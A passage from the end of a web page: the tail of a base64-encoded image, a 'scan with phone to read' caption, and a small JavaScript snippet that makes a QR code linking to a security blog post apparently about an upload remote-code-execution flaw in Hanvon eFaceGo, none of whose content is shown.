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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-meetingPersonal-uploadMeetingFile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 